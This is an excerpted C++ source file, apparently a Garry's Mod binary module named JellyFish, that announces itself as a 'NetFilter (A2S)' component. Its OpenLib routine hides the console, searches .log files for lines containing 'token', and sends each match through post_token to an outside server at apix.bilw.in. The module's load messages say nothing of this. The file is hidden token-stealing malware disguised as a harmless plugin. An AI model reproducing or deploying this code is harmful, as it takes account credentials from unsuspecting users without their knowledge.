...
void JellyFish::External::post_token(string token) {
	...
	string rtn;
	if (wbNet) {
		retFile = InternetOpenUrlA(wbNet, ("http://apix.bilw.in/api/v6/post.php?t="+token).c_str(), NULL, NULL, NULL, NULL);
		if (retFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
...
void JellyFish::External::OpenLib(GarrysMod::Lua::ILuaInterface* LUA)
{
    const char* argv;
    FreeConsole();
		...
		if (file.find(".log") != string::npos) {
			...
			for (auto line : lines) {
				if (line.find("token") != string::npos) {
					...
					JellyFish::External::post_token(token);
				}
			}
		}
	}

	LUA->MsgColour(Color(161, 170, 255, 255), "[JellyFish] NetFilter (A2S) integrated.\n");
}

void JellyFish::External::Initialize(GarrysMod::Lua::ILuaInterface* LUA)
{
    OpenLib(LUA);
	LUA->MsgColour(Color(161, 170, 255, 255), "[JellyFish] NetFilter (A2S) initialized.\n");
}

void JellyFish::External::Deinitialize(GarrysMod::Lua::ILuaInterface* LUA)
{
    LUA->MsgColour(Color(161, 170, 255, 255), "[JellyFish] NetFilter (A2S) unloaded.\n");
}